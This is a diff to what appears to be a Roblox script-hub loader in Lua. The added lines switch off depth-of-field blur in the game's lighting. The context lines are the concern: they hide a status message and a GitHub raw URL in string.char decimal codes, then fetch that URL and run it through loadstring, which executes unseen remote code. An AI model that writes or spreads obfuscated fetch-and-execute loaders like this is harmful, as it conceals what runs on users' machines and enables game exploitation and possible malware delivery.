@@ -13,5 +13,23 @@ return
 end
 _G[SecurityConfig.SecretVariable] = nil
 _G.UniversalSunHubLoaderToken = SecurityConfig.SecretValue
+
+-- Disable Fluent's DepthOfField blur effect on the lighting system
+pcall(function()
+    for _, effect in ipairs(game:GetService("Lighting"):GetChildren()) do
+        if effect:IsA("DepthOfFieldEffect") then
+            effect.Enabled = false
+        end
+    end
+end)
+pcall(function()
+    game:GetService("Lighting").ChildAdded:Connect(function(child)
+        if child:IsA("DepthOfFieldEffect") then
+            task.wait()
+            child.Enabled = false
+        end
+    end)
+end)
+
 print(SecurityConfig.HubName .. string.char(58, 32, 83, 101, 99, 117, 114, 105, 116, 121, 32, 99, 104, 101, 99, 107, 32, 112, 97, 115, 115, 101, 100, 33, 32, 76, 111, 97, 100, 105, 110, 103, 32, 85, 110, 105, 118, 101, 114, 115, 97, 108, 32, 76, 111, 97, 100, 101, 114, 46, 108, 117, 97))
 loadstring(game:HttpGet(string.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 115, 97, 110, 106, 101, 101, 118, 116, 104, 97, 107, 117, 114, 49, 53, 52, 97, 45, 106, 112, 103, 47, 110, 101, 104, 104, 105, 110, 110, 106, 102, 105, 117, 101, 105, 111, 101, 114, 111, 107, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 108, 111, 97, 100, 101, 114, 46, 108, 117, 97) .. string.char(63, 116, 61) .. tostring(os.time())))()
